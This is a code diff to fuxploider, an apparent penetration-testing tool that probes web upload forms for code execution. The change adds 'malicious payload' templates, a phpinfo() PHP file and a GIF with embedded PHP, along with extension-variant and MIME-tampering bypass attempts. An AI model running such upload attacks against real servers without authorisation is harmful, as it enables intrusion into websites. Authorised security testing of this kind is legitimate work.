@@ -3,20 +3,46 @@ import re,requests,argparse,logging,os,coloredlogs,datetime,getpass,tempfile
 from utils import *
 from UploadForm import UploadForm
 
-version = "0.1.8"
+version = "0.1.9"
 logging.basicConfig(datefmt='[%m/%d/%Y-%H:%M:%S]')
 logger = logging.getLogger("fuxploider")
 
 coloredlogs.install(logger=logger,fmt='%(asctime)s %(levelname)s - %(message)s',level=logging.INFO)
 logging.getLogger("requests").setLevel(logging.ERROR)
 
-parser = argparse.ArgumentParser()
+#################### TEMPLATES DEFINITION HERE ######################
+templates = [
+	{#basic php file
+		"templateName" : "phpinfo",
+		"description" : "Basic php file (plain text) with simple call to phpinfo().",
+		"filename":"template.php",
+		"nastyExt":"php",
+		"codeExecRegex":"\\<title\\>phpinfo\\(\\)\\<\\/title\\>(.|\n)*\\<h2\\>PHP License\\<\\/h2\\>",
+		"extVariants":["php1","php2","php3","php4","php5","phtml","pht"]
+	},{#malicious gif with php code in the comments section to bypass getimagesize() like functions
+		"templateName" : "nastygif",
+		"description" : "Valid GIF file with basic call to phpinfo() in the comments section of the file",
+		"filename":"template.gif",
+		"nastyExt":"php",
+		"codeExecRegex":"\\<title\\>phpinfo\\(\\)\\<\\/title\\>(.|\n)*\\<h2\\>PHP License\\<\\/h2\\>",
+		"extVariants":["php1","php2","php3","php4","php5","phtml","pht"]
+	}
+]
+#######################################################################
+templatesNames = [x["templateName"] for x in templates]
+templatesSection = "[TEMPLATES]\nTemplates are malicious payloads meant to be uploaded on the scanned remote server. Code execution detection is done based on the expected output of the payload."
+templatesSection += "\n\tDefault templates are the following (name - description) : "
+for t in templates :
+	templatesSection+="\n\t  * '"+t["templateName"]+"' - "+t["description"]
+
+parser = argparse.ArgumentParser(epilog=templatesSection,description=__doc__, formatter_class=argparse.RawTextHelpFormatter)
 parser.add_argument("-d", "--data", metavar="postData",dest="data", help="Additionnal data to be transmitted via POST method. Example : -d \"key1=value1&key2=value2\"", type=valid_postData)
 parser.add_argument("--proxy", metavar="proxyUrl", dest="proxy", help="Proxy information. Example : --proxy \"user:password@proxy.host:8080\"", type=valid_proxyString)
 parser.add_argument("--proxy-creds",metavar="credentials",nargs='?',const=True,dest="proxyCreds",help="Prompt for proxy credentials at runtime. Format : 'user:pass'",type=valid_proxyCreds)
 parser.add_argument("-f","--filesize",metavar="integer",nargs=1,default=["10"],dest="size",help="File size to use for files to be created and uploaded (in kB).")
 parser.add_argument("--cookies",metavar="omnomnom",nargs=1,dest="cookies",help="Cookies to use with HTTP requests. Example : PHPSESSID=aef45aef45afeaef45aef45&JSESSID=AQSEJHQSQSG",type=valid_postData)
 parser.add_argument("--uploads-path",default=[None],metavar="path",nargs=1,dest="uploadsPath",help="Path on the remote server where uploads are put. Example : '/tmp/uploads/'")
+parser.add_argument("-t","--template",metavar="templateName",nargs=1,dest="template",help="Malicious payload to use for code execution detection. Default is to use every known templates. For a complete list of templates, see the TEMPLATE section.")
 requiredNamedArgs = parser.add_argument_group('Required named arguments')
 requiredNamedArgs.add_argument("-u","--url", metavar="target", dest="url",required=True, help="Web page URL containing the file upload form to be tested. Example : http://test.com/index.html?action=upload", type=valid_url)
 requiredNamedArgs.add_argument("--not-regex", metavar="regex", help="Regex matching an upload failure", type=valid_regex,dest="notRegex")
@@ -36,6 +62,16 @@ parser.add_argument("-y",action="store_true",required=False,dest="detectAllEntry
 
 args = parser.parse_args()
 args.uploadsPath = args.uploadsPath[0]
+
+if args.template :
+	args.template = args.template[0]
+	if args.template not in templatesNames :
+		logging.warning("Unknown template : %s",args.template)
+		cont = input("Use default templates instead ? [Y/n]")
+		if cont not in ["y","Y","yes","YES","Yes",""] :
+			exit()
+	else :
+		templates = [[x for x in templates if x["templateName"] == args.template][0]]
 
 args.verbosity = 0
 if args.verbose :
@@ -170,41 +206,21 @@ if up.validExtensions == [] :
 
 entryPoints = []
 
-#################### TEMPLATE CHOICE HERE, NEEDS TO CHANGE LATER ######################
-templates = [
-	{
-		"filename":"template.php",
-		"extension":"php",
-		"codeExecRegex":"74b928cc738434fb9e4d2f387398958c7e5e816a921ad7d8226ebff094f5ad7b5ec865beccf654e7eca540dd6dd3e17aa11df23f9101ab8436b724ab0bef168b",
-		"extVariants":["php1","php2","php3","php4","php5","phtml","pht"]
-	},{
-		"filename":"template.gif",
-		"extension":"php",
-		"codeExecRegex":"74b928cc738434fb9e4d2f387398958c7e5e816a921ad7d8226ebff094f5ad7b5ec865beccf654e7eca540dd6dd3e17aa11df23f9101ab8436b724ab0bef168b",
-		"extVariants":["php1","php2","php3","php4","php5","phtml","pht"]
-	}
-	]
-#######################################################################################
-logger.info("### Starting shell upload detection (messing with file extensions and mime types...)")
+##############################################################################################################################################
+##############################################################################################################################################
+logger.info("### Starting code execution detection (messing with file extensions and mime types...)")
 wantToStop = False
 for template in templates :
 	logger.debug("Template in use : %s",template)
 	if wantToStop :
 		break
-	#template[0] : file name
-	#template[1] : extension
-	#template[2] : regex for code exec detection
-	#template[3] : extensions variants
+
 	templatefd = open(template["filename"],"rb")
-	nastyExt = template["extension"]
+	nastyExt = template["nastyExt"]
 	nastyMime = getMime(extensions,nastyExt)
 	nastyExtVariants = template["extVariants"]
-	#################################################################
-
-
 
 	attempts = []
-	#########################################################################################
 	nbOfValidExtensions = len(up.validExtensions)
 	nbOfEntryPointsFound = 0
 	i = 0
@@ -214,9 +230,9 @@ for template in templates :
 		#exec all known techniques
 		##	for each variant of the code execution trigerring extension (php,asp etc)
 		### using either bad or good mime type
-		for nastyVariant in nastyExtVariants+[nastyExt] :
+		for nastyVariant in [nastyExt]+nastyExtVariants :
 			##Naive attempt
-			attempts.append({"suffix":"."+nastyExt,"mime":nastyMime})
+			attempts.append({"suffix":"."+nastyVariant,"mime":nastyMime})
 			##mime type tampering
 			attempts.append({"suffix":"."+nastyVariant,"mime":legitMime})
 			##double extension bad.good with nasty mime type
@@ -251,15 +267,6 @@ for template in templates :
 				nbOfEntryPointsFound += 1
 				foundEntryPoint = a
 				foundEntryPoint["template"] = template["filename"]
-				################
-				################ a enlever/continuer ici, tentative d'utilisation des getimagesize pour bypasser tout le bozin
-				################
-				if foundEntryPoint["template"] == "template.gif" :
-					print(foundEntryPoint)
-					input()
-				################
-				################
-				################
 				entryPoints.append(foundEntryPoint)
 				if not args.detectAllEntryPoints :
 					cont = input("Continue attacking ? [y/N] : ")
@@ -267,10 +274,9 @@ for template in templates :
 						wantToStop = True
 						break
 
-
 		i += 1
 	templatefd.close()
-
+print()
 logging.info("%s entry point(s) found using %s HTTP requests.",nbOfEntryPointsFound,up.httpRequests)
 print("Found the following entry points : ")
 print(entryPoints)
